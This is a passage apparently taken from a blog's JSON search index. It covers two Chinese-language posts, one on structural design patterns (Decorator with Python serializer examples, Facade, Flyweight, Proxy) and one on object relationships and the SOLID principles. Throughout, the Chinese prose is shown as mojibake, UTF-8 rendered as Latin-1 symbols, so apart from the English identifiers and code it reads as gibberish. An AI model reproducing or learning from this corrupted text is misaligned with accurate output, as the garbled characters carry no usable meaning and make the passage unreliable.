ä¸ºåŸºäºæœåŠ¡å™¨çš„æŒä¹…åŒ–ç±»å¢åŠ  gzip åŠŸèƒ½ã€‚\næ­¤æ—¶ï¼Œç±»å›¾å˜æˆä¸‹é¢è¿™æ ·ï¼š\næå‡æ•°æ®å®‰å…¨æ€§ æ–°éœ€æ±‚åˆæ¥äº†ï¼Œæˆ‘ä»¬å¸Œæœ›ä¸ºæŸäº›æ•æ„Ÿæ•°æ®æä¾›åŠ å¯†åŠŸèƒ½ï¼Œä»¥ä¾¿æå‡æ•°æ®çš„å®‰å…¨æ€§ã€‚å’Œå‰é¢çš„ gzip åŠŸèƒ½ç±»ä¼¼ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æ‰©å±•å­ç±»æ¥å®ç°ï¼Œæ‰©å±•åçš„ç±»å›¾å¦‚ä¸‹æ‰€ç¤ºï¼š\nGzip + åŠ å¯†åŠŸèƒ½ é’ˆå¯¹æœ‰äº›æ•°æ®ï¼Œæˆ‘ä»¬æ—¢å¸Œæœ›å‹ç¼©ï¼Œåˆå¸Œæœ›åŠ å¯†ï¼Œåº”è¯¥æ€ä¹ˆå¤„ç†å‘¢ï¼Ÿå¦‚æœä»ç„¶æŒ‰ç…§åˆ›å»ºå­ç±»çš„æ€è·¯ï¼Œæˆ‘ä»¬çš„ç±»å›¾å¤§æ¦‚ä¼šå‘å±•æˆè¿™æ ·ï¼š\næ˜¯ä¸æ˜¯æ„Ÿè§‰å“ªé‡Œä¸å¤ªå¯¹ï¼Ÿå­ç±»æ•°é‡è¶Šæ¥è¶Šå¤šï¼Œè€Œä¸”å¼€å§‹å‡ºç°äº†ä¸å°‘å†—ä½™ä»£ç ï¼Œä¾‹å¦‚ SecureGzipFileBackendSerializer å’Œ SecureFileBackendSerializer çš„ä»£ç ä¸€å®šæœ‰ä¸å°‘å†—ä½™çš„æˆåˆ†ï¼Œ SecureGzipServerBackendSerializer å’Œ SecureServerBackendSerializer ä¹Ÿæ˜¯å¦‚æ­¤ã€‚\nå¼•å…¥è£…é¥°è€…æ¨¡å¼ æœ‰æ²¡æœ‰æ›´å¥½çš„æ–¹æ¡ˆï¼Œæ¥è§£å†³ä¸Šè¿°è¿™ç±»é—®é¢˜ï¼Ÿç­”æ¡ˆæ˜¯ç”¨ç»„åˆæ›¿ä»£ç»§æ‰¿ï¼ˆå‚è€ƒç»„åˆå¤ç”¨åŸåˆ™ï¼‰ï¼Œå…·ä½“åˆ°è¿™é‡Œï¼Œå°±æ˜¯åˆ©ç”¨è£…é¥°å™¨ï¼ˆDecoratorï¼‰æ¨¡å¼ã€‚\næˆ‘ä»¬æ¥æ¼”ç¤ºä¸€ä¸‹ï¼Œé‡‡ç”¨è£…é¥°å™¨æ¨¡å¼ä¼šå¦‚ä½•å®ç° gzip åŠŸèƒ½ï¼Œä»¥åŠåŠ å¯†åŠŸèƒ½ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import gzip # å¢åŠ  gzip åŠŸèƒ½çš„ Serializer class GzipSerializer(Serializer): def __init__(self, s: Serializer): self._s = s def write(self, bs): bs = gzip.compress(bs) self._s.write(bs) # å¢åŠ åŠ å¯†åŠŸèƒ½çš„ Serializer class SecureSerializer(Serializer): def __init__(self, s: Serializer): self._s = s def write(self, bs): bs = self._encrypt(bs) self._s.write(bs) å®¢æˆ·ä¾§ä½¿ç”¨èµ·æ¥ä¹Ÿéå¸¸ç®€å•ï¼š\n1 2 3 4 5 6 s = FileBackendSerializer('/path/to/file') # å¢åŠ  gzip åŠŸèƒ½ s = GzipSerializer(s) # å¢åŠ åŠ å¯†åŠŸèƒ½ s = SecureSerializer(s) ä¸Šè¿°çš„ç»„åˆå¯ä»¥çµæ´»æ­é…ï¼Œä¾‹å¦‚ï¼Œä½ å¯ä»¥ä¸ºæŸäº›æ•°æ®å¢åŠ  gzip åŠŸèƒ½ï¼ŒæŸäº›æ•°æ®å¢åŠ å®‰å…¨åŠŸèƒ½ï¼Œå¦ä¸€äº›æ•°æ®åŒæ—¶å¢åŠ  gzip å’Œå®‰å…¨åŠŸèƒ½ã€‚\nå¦å¤–ï¼Œé…åˆ ServerBackendSerializer ä½¿ç”¨ä¹Ÿå®Œå…¨æ²¡æœ‰é—®é¢˜ï¼š\n1 2 3 4 5 6 s = ServerBackendSerializer('example.com') # å¢åŠ  gzip åŠŸèƒ½ s = GzipSerializer(s) # å¢åŠ åŠ å¯†åŠŸèƒ½ s = SecureSerializer(s) å¦‚æœæœ‰å…¶ä»–çš„æ–°å¢è¯‰æ±‚ï¼Œä¾‹å¦‚å¯¹æ•°æ®åšè¿‡æ»¤ï¼Œä¹Ÿåªéœ€æŒ‰ç…§ç±»ä¼¼çš„æ–¹å¼ï¼Œå¢åŠ ä¸€ä¸ª FilterSerializer å³å¯ã€‚è¿™é‡Œçš„å…³é”®ç‚¹æ˜¯ï¼Œåœ¨ä¿æŒæ¥å£ä¸€è‡´çš„å‰æä¸‹ï¼Œé€šè¿‡ç»„åˆçš„æ–¹å¼åœ¨åŸæœ‰çš„å¯¹è±¡ä¸ŠåŒ…è£…ï¼ˆè£…é¥°ï¼‰ä¸Šä¸€å±‚æ–°çš„åŠŸèƒ½ã€‚\næˆ‘ä»¬çœ‹ä¸€ä¸‹é‡‡ç”¨è£…é¥°å™¨æ¨¡å¼åçš„ç±»å›¾ï¼š\næ˜¯ä¸æ˜¯å¹²å‡€æ¸…çˆ½äº†å¾ˆå¤šï¼Ÿ\nç›¸å…³æ¨¡å¼ é€‚é…å™¨ (Adapter): Decorator ä¸åŒäº Adapter, å› ä¸º Decorator ä¸æ”¹å˜å¯¹è±¡çš„æ¥å£ï¼Œè€Œä»…æ·»åŠ ï¼ˆæˆ–æ”¹å˜ï¼‰å¯¹è±¡çš„åŠŸèƒ½ã€‚ ç»„åˆ (Composite): å¯ä»¥å°† Decorator çœ‹æˆæ˜¯ä¸€ä¸ªé€€åŒ–çš„ã€ä»…æœ‰ä¸€ä¸ªç»„ä»¶çš„ Compositeã€‚ç„¶è€Œè¿™ä¸¤è€…çš„ç›®çš„ä¸åŒï¼ŒDecorator çš„ç›®çš„æ˜¯ä¸ºå¯¹è±¡æ·»åŠ é¢å¤–çš„åŠŸèƒ½ï¼Œè€Œéå»ºç«‹ä¸€ä¸ªå…·æœ‰å±‚æ¬¡ç»“æ„çš„å¯¹è±¡èšåˆã€‚ ç­–ç•¥ (Strategy): ç”¨ä¸€ä¸ªè£…é¥°å¯ä»¥ä¸ºå¯¹è±¡æ·»åŠ é¢å¤–çš„åŠŸèƒ½ï¼Œè€Œ Strategy å¯ä»¥è®©ä½ åŠ¨æ€æ›¿æ¢æŸç§åŠŸèƒ½ã€‚è¿™æ˜¯æ”¹å˜å¯¹è±¡çš„ä¸¤ç§é€”å¾„ã€‚ å¤–è§‚ (Facade) æ„å›¾ ä¸ºå­ç³»ç»Ÿä¸­çš„ä¸€ç»„æ¥å£æä¾›ä¸€ä¸ªä¸€è‡´çš„ç•Œé¢ï¼ŒFacade æ¨¡å¼å®šä¹‰äº†ä¸€ä¸ªé«˜å±‚æ¥å£ï¼Œè¿™ä¸ªæ¥å£ä½¿å¾—è¿™ä¸€å­ç³»ç»Ÿæ›´åŠ å®¹æ˜“ä½¿ç”¨ã€‚\nä¸‹é¢è¿™ä¸ªç¤ºæ„å›¾ï¼Œå¯ä»¥æ¯”è¾ƒå½¢è±¡çš„è¡¨è¾¾ Facade æ¨¡å¼çš„æ„å›¾ï¼š\né€‚ç”¨æ€§ å½“ä½ è¦ä¸ºä¸€ä¸ªå¤æ‚å­ç³»ç»Ÿæä¾›ä¸€ä¸ªç®€å•æ¥å£æ—¶ã€‚\nå­ç³»ç»Ÿå¾€å¾€å› ä¸ºä¸æ–­æ¼”åŒ–è€Œå˜å¾—è¶Šæ¥è¶Šå¤æ‚ï¼Œåœ¨ä½¿ç”¨å¤§å¤šæ•°æ¨¡å¼æ—¶ï¼Œéƒ½ä¼šäº§ç”Ÿæ›´å¤šæ›´å°çš„ç±»ã€‚è¿™ä½¿å¾—å­ç³»ç»Ÿæ›´å…·å¯å¤ç”¨æ€§ï¼Œä¹Ÿæ›´å®¹æ˜“å¯¹å­ç³»ç»Ÿè¿›è¡Œå®šåˆ¶ï¼Œä½†ä¹Ÿç»™é‚£äº›ä¸éœ€è¦å®šåˆ¶å­ç³»ç»Ÿçš„ç”¨æˆ·å¸¦æ¥ä¸€äº›ä½¿ç”¨ä¸Šçš„å›°éš¾ã€‚â€‹Facade å¯ä»¥æä¾›ä¸€ä¸ªç®€å•çš„ç¼ºçœè§†å›¾, è¿™ä¸€è§†å›¾å¯¹å¤§å¤šæ•°ç”¨æˆ·æ¥è¯´å·²ç»è¶³å¤Ÿï¼Œè€Œé‚£äº›éœ€è¦æ›´å¤šçš„å¯å®šåˆ¶æ€§çš„ç”¨æˆ·å¯ä»¥è¶Šè¿‡ Facade å±‚ã€‚\nå½“ä½ éœ€è¦æ„å»ºä¸€ä¸ªå±‚æ¬¡ç»“æ„çš„å­ç³»ç»Ÿæ—¶ï¼Œâ€‹ä½¿ç”¨ Facade æ¨¡å¼å®šä¹‰å­ç³»ç»Ÿä¸­æ¯å±‚çš„å…¥å£ç‚¹â€‹ã€‚å¦‚æœå­ç³»ç»Ÿä¹‹é—´æ˜¯ç›¸äº’ä¾èµ–çš„ï¼Œå¯ä»¥è®©å®ƒä»¬ä»…é€šè¿‡ Facade è¿›è¡Œé€šä¿¡ï¼Œä»è€Œç®€åŒ–å®ƒä»¬ä¹‹é—´çš„ä¾èµ–å…³ç³»ã€‚\nç›¸å…³æ¨¡å¼ æŠ½è±¡å·¥å‚ (Abstract Factory) æ¨¡å¼å¯ä»¥ Facade æ¨¡å¼ä¸€èµ·ä½¿ç”¨ä»¥æä¾›ä¸€ä¸ªæ¥å£ï¼Œè¯¥æ¥å£å¯ä»¥éšè—å­ç³»ç»Ÿå¯¹è±¡çš„åˆ›å»ºç»†èŠ‚ã€‚ ä¸­ä»‹è€… (Mediator) æ¨¡å¼ä¸ Facade æ¨¡å¼æœ‰äº›ç›¸ä¼¼ä¹‹å¤„ï¼Œå®ƒä¹ŸæŠ½è±¡äº†ä¸€äº›å·²æœ‰ç±»çš„åŠŸèƒ½ã€‚ä½†æ˜¯å®ƒä»¬çš„ç›®çš„ä¸åŒï¼ŒMediator ä¸»è¦æ˜¯æŠ½è±¡å¯¹ç­‰å¯¹è±¡ä¹‹é—´çš„é€šä¿¡ï¼Œè¿™äº›å¯¹è±¡çŸ¥é“ Mediator çš„å­˜åœ¨ã€‚è€Œå­ç³»ç»Ÿå¹¶ä¸çŸ¥é“ Facade çš„å­˜åœ¨ã€‚ å•ä¾‹ (Singleton) ã€‚é€šå¸¸ä»…éœ€è¦ä¸€ä¸ª Facade å¯¹è±¡ï¼Œè¿™ç§æ—¶å€™å¯ä»¥è€ƒè™‘ä½¿ç”¨å•ä¾‹ã€‚ äº«å…ƒ (Flyweight) æ„å›¾ è¿ç”¨å…±äº«æŠ€æœ¯æœ‰æ•ˆåœ°æ”¯æŒå¤§é‡ç»†ç²’åº¦çš„å¯¹è±¡ã€‚\né€‚ç”¨æ€§ å½“ä»¥ä¸‹æƒ…å†µéƒ½æˆç«‹æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ Flyweight æ¨¡å¼ï¼š\nä¸€ä¸ªåº”ç”¨ç¨‹åºä½¿ç”¨äº†å¤§é‡çš„å¯¹è±¡ã€‚ å®Œå…¨ç”±äºä½¿ç”¨å¤§é‡çš„å¯¹è±¡é€ æˆå¾ˆå¤§çš„å†…å­˜å¼€é”€ã€‚ å¯¹è±¡çš„å¤§å¤šæ•°çŠ¶æ€éƒ½å¯ä»¥å˜ä¸ºå¤–éƒ¨çŠ¶æ€ã€‚ å¦‚æœåˆ é™¤å¯¹è±¡çš„å¤–éƒ¨çŠ¶æ€ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨ç›¸å¯¹è¾ƒå°‘çš„å…±äº«å¯¹è±¡å–ä»£å¾ˆå¤šç»„å¯¹è±¡ã€‚ åº”ç”¨ç¨‹åºä¸ä¾èµ–äºå¯¹è±¡æ ‡è¯†ã€‚ç”±äº Flyweight å¯¹è±¡å¯ä»¥è¢«å…±äº«ï¼Œæ‰€ä»¥ä¸¤ä¸ªé€»è¾‘ä¸Šä¸åŒçš„å¯¹è±¡ï¼Œå…¶ç‰©ç†ä¸Šå¯èƒ½æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œå› æ­¤åº”ç”¨ç¨‹åºä¸åº”è¯¥ä¾èµ–å¯¹è±¡æ ‡è¯†çš„æ¯”è¾ƒã€‚ ç»“æ„ ç›¸å…³æ¨¡å¼ åœ¨å®ç° State çŠ¶æ€ æ¨¡å¼å’Œ Strategy ç­–ç•¥ æ¨¡å¼æ—¶ï¼Œå¦‚æœæ¶‰åŠçŠ¶æ€æˆ–ç­–ç•¥è¾ƒå¤šçš„ï¼Œå¯ä»¥è€ƒè™‘é‡‡ç”¨ Flyweight æ¨¡å¼æ¥å®ç°ã€‚\nä»£ç† (Proxy) æ„å›¾ ä¸ºå…¶ä»–å¯¹è±¡æä¾›ä¸€ç§ä»£ç†ä»¥æ§åˆ¶å¯¹è¿™ä¸ªå¯¹è±¡çš„è®¿é—®ã€‚\nä¸åŒç±»å‹çš„ä»£ç† è¿œç¨‹ä»£ç†ï¼ˆRemote Proxyï¼‰ ä¸ºä¸€ä¸ªå¯¹è±¡åœ¨ä¸åŒçš„åœ°å€ç©ºé—´æä¾›å±€éƒ¨ä»£è¡¨ã€‚Android çš„ AIDL ç”Ÿæˆçš„ Stub.Proxy ç±»å°±æ˜¯è¿™æ ·ä¸€ç§ä»£ç†ã€‚\nè™šä»£ç†ï¼ˆVirtual Proxyï¼‰ æŒ‰éœ€åˆ›å»ºå¼€é”€è¾ƒå¤§çš„å¯¹è±¡ã€‚\nCopy-on-write (COW) ä¼˜åŒ–\nè¿™é‡Œæ‹“å±•ä¸€ä¸‹ï¼Œè¿˜å¯ä»¥å®ç°é€æ˜çš„ copy-on-write ä¼˜åŒ–ã€‚æ‹·è´ä¸€ä¸ªåºå¤§è€Œå¤æ‚çš„å¯¹è±¡æ˜¯ä¸€ç§å¼€é”€å¾ˆå¤§çš„æ“ä½œï¼Œå¦‚æœè¿™ä¸ªæ‹·è´æ ¹æœ¬æ²¡æœ‰è¢«ä¿®æ”¹ï¼Œé‚£ä¹ˆè¿™äº›å¼€é”€å°±æ²¡æœ‰å¿…è¦ã€‚ç”¨ä»£ç†å»¶è¿Ÿè¿™ä¸€æ‹·è´è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥ä¿è¯åªæœ‰å½“è¿™ä¸ªå¯¹è±¡è¢«ä¿®æ”¹çš„æ—¶å€™æ‰å¯¹å®ƒè¿›è¡Œæ‹·è´ã€‚\nä¿æŠ¤ä»£ç†ï¼ˆProtection Proxyï¼‰ æ§åˆ¶å¯¹åŸå§‹å¯¹è±¡çš„è®¿é—®ã€‚ä¿æŠ¤ä»£ç†ç”¨äºå¯¹è±¡åº”è¯¥æœ‰ä¸åŒçš„è®¿é—®æƒé™çš„æ—¶å€™ã€‚\næ™ºèƒ½å¼•ç”¨ï¼ˆSmart Referenceï¼‰ å–ä»£ç®€å•çš„æŒ‡é’ˆï¼Œå®ƒåœ¨è®¿é—®å¯¹è±¡æ—¶æ‰§è¡Œä¸€äº›é™„åŠ æ“ä½œï¼Œå…¸å‹ç”¨é€”åŒ…æ‹¬ï¼š\nå¯¹æŒ‡å‘å®é™…å¯¹è±¡çš„å¼•ç”¨è®¡æ•°ï¼Œè¿™æ ·å½“è¯¥å¯¹è±¡æ²¡æœ‰å¼•ç”¨æ—¶ï¼Œå¯ä»¥è‡ªåŠ¨é‡Šæ”¾å®ƒï¼ˆä¹Ÿç§°ä¸º Smart Pointerï¼‰ã€‚ å½“ç¬¬ä¸€æ¬¡å¼•ç”¨ä¸€ä¸ªæŒä¹…å¯¹è±¡æ—¶ï¼Œå°†å®ƒè£…å…¥å†…å­˜ã€‚ åœ¨è®¿é—®ä¸€ä¸ªå®é™…å¯¹è±¡å‰ï¼Œæ£€æŸ¥æ˜¯å¦å·²ç»é”å®šäº†å®ƒï¼Œä»¥ç¡®ä¿å…¶ä»–å¯¹è±¡ä¸èƒ½æ”¹å˜å®ƒã€‚ ç»“æ„ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Proxy +--------+ +---------+ | Client +-----------------\u003e+ Subject | +--------+ +---------+ | request | | ... | +---------+ á +---------------------------+ | | +-------+-----+ realSubject +----+----+ | RealSubject +\u003c---------------+ Proxy | +------------------------+ +-------------+ +---------+ | ... | | request | | request +------+ realSubject.request() | | ... | | ... | | ... | +-------------+ +---------+ +------------------------+ ç›¸å…³æ¨¡å¼ Adapter é€‚é…å™¨: é€‚é…å™¨ä¸ºå®ƒæ‰€é€‚é…çš„å¯¹è±¡æä¾›ä¸€ä¸ªä¸åŒçš„æ¥å£ã€‚ç›¸åï¼Œä»£ç†æä¾›ä¸å®ƒçš„å®ä½“ç›¸åŒçš„æ¥å£ã€‚ Decorator è£…é¥°å™¨: è£…é¥°çš„å®ç°éƒ¨åˆ†å’Œä»£ç†æœ‰ç‚¹ç±»ä¼¼ï¼Œä½†æ˜¯ç›®çš„ä¸åŒã€‚è£…é¥°ä¸ºå¯¹è±¡æ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªåŠŸèƒ½ï¼Œè€Œä»£ç†åˆ™æ§åˆ¶å¯¹å¯¹è±¡çš„è®¿é—®ã€‚å¦å¤–å®ç°ä¸Šè™½ç„¶æœ‰ç›¸ä¼¼ä¹‹å¤„ï¼Œä½†è¿˜æ˜¯æœ‰äº›ç»†å¾®çš„å·®å¼‚ã€‚ä¾‹å¦‚ï¼ŒRemote Proxy å¹¶ä¸åŒ…å«å¯¹å®ä½“çš„ç›´æ¥å¼•ç”¨ï¼Œè€Œåªæ˜¯ä¸€ä¸ªé—´æ¥å¼•ç”¨ï¼ˆä¾‹å¦‚ Android AIDL çš„ä¾‹å­ï¼‰ã€‚ ","description":"","tags":["design-pattern","architecture"],"title":"è®¾è®¡æ¨¡å¼ï¼šç»“æ„å‹ (Structural)","uri":"/posts/design-patterns-structural/"},{"categories":null,"content":" å‰è¨€ æœ¬æ–‡æ˜¯ç¬”è€…å¯¹è½¯ä»¶è®¾è®¡åŸåˆ™ã€è®¾è®¡æ¨¡å¼çš„ä¸€ä¸ªæ¢³ç†ï¼Œå¾ˆå¤šå†…å®¹å‚è€ƒè‡ªã€Šè®¾è®¡æ¨¡å¼ï¼šå¯å¤ç”¨é¢å‘å¯¹è±¡è½¯ä»¶çš„åŸºç¡€ã€‹ä¸€ä¹¦ï¼ˆå°¤å…¶æ˜¯è®¾è®¡æ¨¡å¼éƒ¨åˆ†ï¼‰ã€‚å…¶ä¸­ä¹ŸåŒ…å«äº†ç¬”è€…ä¸ªäººçš„ä¸€äº›æ€è€ƒå’Œæ€»ç»“ã€‚\næ¦‚å¿µå’Œæœ¯è¯­ æœ¬ç« æ•´ç†äº†ä¸€äº›å®¹æ˜“æ··æ·†çš„æ¦‚å¿µå’Œæœ¯è¯­ã€‚\nå¯¹è±¡é—´å…³ç³» å…ˆç”¨ä¸€å¼  UML å›¾æ¥ç›´è§‚å±•ç¤ºä¸€ä¸‹ï¼š\nç®€å•è§£é‡Šä¸€ä¸‹ï¼š\nInheritance ç»§æ‰¿ï¼Œè¿™ä¸ªå¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯çˆ¶ç±»å’Œå­ç±»çš„å…³ç³»ã€‚ Composition åˆæˆï¼Œè¿™ä¸ªæ˜¯é™¤äº†ç»§æ‰¿ä»¥å¤–ï¼Œä¸¤ä¸ªå¯¹è±¡ä¹‹é—´æ‰€èƒ½æœ‰çš„æœ€å¼ºçš„å…³ç³»ã€‚åˆæˆæ„å‘³ç€ï¼š Eye is a part of Dog, å³ Eye æ˜¯ Dog ä¸å¯åˆ†å‰²çš„ä¸€éƒ¨åˆ†ã€‚ Eye çš„ç”Ÿå‘½å‘¨æœŸå®Œä¸”ç”± Dog æ§åˆ¶ï¼Œ Dog æ¶ˆå¤±åˆ™ Eye ä¹Ÿä¸å¤å­˜åœ¨ã€‚ ä»å®ç°ä¸Šæ¥è¯´ï¼Œä¸€èˆ¬ Eye å¯¹è±¡ä½œä¸º Dog çš„ä¸€ä¸ªæˆå‘˜å˜é‡ï¼Œä¸”ç”± Dog è´Ÿè´£ Eye çš„åˆ›å»ºåŠå…¶å®Œæ•´çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€‚\nAggregation èšåˆï¼Œå…³ç³»å¼ºåº¦æ¬¡äº Composition ã€‚å…¶å«ä¹‰å¦‚ä¸‹ï¼š ç­çº§ç”±å…¨ç­å­¦ç”Ÿç»„æˆï¼Œä½†å­¦ç”Ÿä¸æ˜¯ç­çº§ä¸å¯åˆ†å‰²çš„ä¸€éƒ¨åˆ†ï¼ˆå› ä¸ºå­¦ç”Ÿå¯ä»¥è½¬å­¦ï¼Œä½†æ˜¯ç­çº§ä¼šä¸€ç›´å­˜åœ¨ï¼‰ã€‚ ä¸¤è€…çš„ç”Ÿå‘½å‘¨æœŸä¹Ÿä¸éœ€è¦å®Œä¸”ä¸€è‡´ã€‚ä¸€æ–¹é¢ï¼Œå­¦ç”Ÿå¯ä»¥è¾å­¦æˆ–è€…è½¬å­¦ï¼Œä½†ç­çº§ä¸å—å½±å“ï¼›å¦ä¸€æ–¹é¢ï¼Œç­çº§ä¹Ÿå¯ä»¥è§£æ•£æˆ–é‡ç»„ï¼ˆæ¯”å¦‚åˆå¹¶åˆ°å…¶ä»–ç­ï¼‰ï¼Œä½†å­¦ç”Ÿä»ç„¶å­˜åœ¨ã€‚ ä»å®ç°ä¸Šæ¥è¯´ï¼Œ Student å¯¹è±¡ç”± Class å¯¹è±¡æ‰€æŒæœ‰ï¼Œä¸”ä¸€èˆ¬æ˜¯é€šè¿‡ Class çš„ä¸€ä¸ªé›†åˆç±»æˆå‘˜å˜é‡æ‰€æŒæœ‰ã€‚\nAssociation å…³è”ï¼Œå…³ç³»å¼ºåº¦å†æ¬¡ä¹‹ã€‚å…¶ä»…ä»…æ„å‘³ç€ Has-A çš„å…³ç³»ã€‚å•ä»å¯¹è±¡æŒæœ‰çš„è§’åº¦çœ‹ï¼Œå’Œ Aggregation çš„å·®åˆ«ä¸å¤§ï¼Œæˆ‘ä¸ªäººè§‰å¾—ä¸»è¦çš„åŒºåˆ«å¯èƒ½æœ‰å¦‚ä¸‹å‡ ç‚¹ï¼š Aggregation ä¼šæ›´å¼ºè°ƒâ€œé›†ä½“ï¼ä¸ªä½“â€çš„å…³ç³»ä¸€äº›ï¼Œä¸€èˆ¬æ¥è¯´éšå«äº†â€œä¸€å¯¹å¤šâ€çš„æ„æ€ã€‚ Association æ˜¯ä¸€ç§æ›´åŠ é€šç”¨çš„â€œå¯¹è±¡é—´æŒæœ‰å…³ç³»â€çš„æè¿°ï¼ŒèŒƒå›´ä¼šæ¯” Aggregation æ›´å¹¿ã€‚äº‹å®ä¸Šï¼Œ Aggregation å¯ä»¥çœ‹ä½œæ˜¯ Association çš„ä¸€ç§ç‰¹ä¾‹ã€‚ ä»å®ç°ä¸Šæ¥è¯´ï¼Œ VideoEditor ä¼šæŒæœ‰ä¸€ä¸ª MediaCodec, ä¸€èˆ¬æ˜¯é€šè¿‡ä¸€ä¸ªæˆå‘˜å˜é‡æ¥æŒæœ‰ã€‚\nDependency ä¾èµ–ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯å¼ºåº¦æœ€å¼±çš„ä¸€ç§å…³ç³»äº†ï¼Œä»…è¡¨ç¤ºä¸¤è€…ä¹‹é—´å­˜åœ¨ä¾èµ–å…³ç³»ï¼Œä½†å¹¶ä¸é™å®šä¸¤è€…ä¹‹é—´æ˜¯å¦‚ä½•ä¾èµ–çš„ã€‚ä¾‹å¦‚ï¼Œæœ€å¼±çš„ä¸€ç§ä¾èµ–å¯èƒ½æ˜¯åœ¨ A å¯¹è±¡æ‰€å±çš„ç±»çš„æŸä¸ªæ–¹æ³•é‡Œé¢ä½¿ç”¨åˆ°äº† B ç±»ã€‚æ­£å¦‚å›¾ä¸­çš„ç¤ºä¾‹ï¼Œè§†é¢‘ç¼–è¾‘å™¨åœ¨åŠ è½½æŸå¼ å›¾ç‰‡ç´ æçš„æ—¶å€™ï¼Œå¯èƒ½åœ¨ loadImage() æ–¹æ³•ä¸­ä½¿ç”¨äº† ImageDecoder, ä½†å¹¶ä¸ä¼šåœ¨æˆå‘˜å˜é‡ä¸­æŒæœ‰è¯¥å¯¹è±¡çš„å¼•ç”¨ã€‚ ä¸‹é¢è¿™å¼ å›¾å±•ç¤ºäº† Association, Composition, Aggregation ä¸‰è€…ä¹‹é—´çš„å…³ç³»ï¼š\nè®¾è®¡åŸåˆ™ SOLID åŸåˆ™ SOLID æŒ‡é¢å‘å¯¹è±¡è®¾è®¡çš„äº”ä¸ªåŸºæœ¬åŸåˆ™ï¼š\nSâ€‹ingle-responsibility Principle å•ä¸€èŒè´£åŸåˆ™ Oâ€‹pen-closed Principle å¼€é—­åŸåˆ™ Lâ€‹iskov Substitution Principle é‡Œæ°æ›¿æ¢åŸåˆ™ Iâ€‹nterface Segregation Principle æ¥å£éš”ç¦»åŸåˆ™ Dâ€‹ependency Inversion Principle ä¾èµ–å€’ç½®åŸåˆ™ ä¸‹é¢å¯¹è¿™äº”ä¸ªåŸºæœ¬åŸåˆ™é€ä¸€è¿›è¡Œä»‹ç»ã€‚\nSingle-responsibility Principle å•ä¸€èŒè´£åŸåˆ™ ä¸€ä¸ªç±»åº”è¯¥åªå¯¹ä¸€ä»¶äº‹æƒ…è´Ÿè´£ã€‚\næ¢å¥è¯è¯´ï¼Œå°±æ˜¯â€‹ä¸€ä¸ªç±»åº”è¯¥åªæœ‰ä¸€ä¸ªå¼•èµ·å˜åŒ–çš„åŸå› â€‹ã€‚\næˆ‘ä»¬çŸ¥é“ï¼Œå¯¹ç°æœ‰ä»£ç è¿›è¡Œä¿®æ”¹æ˜¯å¾ˆå®¹æ˜“å¼•èµ·é—®é¢˜çš„ã€‚å¦‚æœä¸€ä¸ªç±»å…·æœ‰ä¸¤ä¸ªæˆ–æ›´å¤šçš„å¼•èµ·ä¿®æ”¹çš„åŸå› ï¼Œé‚£ä¹ˆå°†æ¥è¿™ä¸ªç±»å˜åŒ–çš„å‡ ç‡å°†ä¼šå¤§å¤§ä¸Šå‡ã€‚è€Œä¸”å½“å®ƒçœŸæ­£è¢«ä¿®æ”¹æ—¶ï¼Œä½ è®¾è®¡ä¸­çš„ä¸¤ä¸ªæˆ–å¤šä¸ªæ–¹é¢éƒ½ä¼šå—åˆ°å½±å“ï¼ˆå–å†³äºè¯¥ç±»çš„èŒè´£æ•°é‡ï¼‰ï¼Œä¸å¯æ§å› ç´ ä¼šè¿›ä¸€æ­¥æé«˜ã€‚åŒæ—¶ï¼ŒèŒè´£è¿‡å¤šä¹Ÿä¼šå¢åŠ åç»­ç»´æŠ¤äººå‘˜çš„ç†è§£æˆæœ¬ã€‚\nä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚è®¾è®¡æ¨¡å¼ä¸­çš„è¿­ä»£å™¨æ¨¡å¼ï¼Œå°±å¸®åŠ©æˆ‘ä»¬æŠŠå¯¹é›†åˆçš„éå†æ“ä½œè¿™é¡¹èŒè´£ç»™å‰¥ç¦»å‡ºæ¥ï¼Œä½¿å¾—é›†åˆå†…éƒ¨åªéœ€å…³å¿ƒé›†åˆè‡ªèº«åŠŸèƒ½çš„å®ç°ï¼Œè€Œæ— éœ€æ“å¿ƒå¦‚ä½•éå†é›†åˆå…ƒç´ è¿™é¡¹åŠŸèƒ½ã€‚ç›¸åï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥åœ¨é›†åˆå†…éƒ¨å®ç°è¿­ä»£åŠŸèƒ½ï¼Œé‚£æˆ‘ä»¬å°±ç»™äº†è¿™ä¸ªç±»ä¸¤ä¸ªå˜åŒ–çš„åŸå› ï¼š\nå¦‚æœé›†åˆæœ¬èº«çš„åŠŸèƒ½ï¼ˆä¾‹å¦‚å…ƒç´ çš„å­˜å‚¨ç»“æ„æˆ–æ“ä½œï¼‰å‘ç”Ÿæ”¹å˜ï¼Œè¿™ä¸ªç±»ä¼šè¢«ä¿®æ”¹ï¼› å¦‚æœéå†çš„æ–¹å¼å‘ç”Ÿæ”¹å˜ï¼Œè¿™ä¸ªç±»ä¹Ÿä¼šè¢«ä¿®æ”¹ã€‚ å› æ­¤ï¼Œè¿™ä¸ªç±»å°†æ¥è¢«ä¿®æ”¹çš„æœºç‡å¤§å¹…ä¸Šå‡ï¼Œå¢åŠ äº†ä»£ç çš„ä¸ç¨³å®šå› ç´ ã€‚å¦å¤–ï¼Œç”±äºè¿™ä¸¤é¡¹åŠŸèƒ½æ”¾åœ¨ä¸€èµ·å®ç°ï¼Œå½¼æ­¤ä¹‹é—´å¾ˆå¯èƒ½ä¼šå‘ç”Ÿäº’ç›¸è€¦åˆï¼Œä¿®æ”¹å…¶ä¸­ä¸€é¡¹å¯èƒ½ä¼šå¯¼è‡´å¦ä¸€é¡¹ä¹Ÿéœ€è¦ä¿®æ”¹ï¼Œä»è€Œå¢åŠ 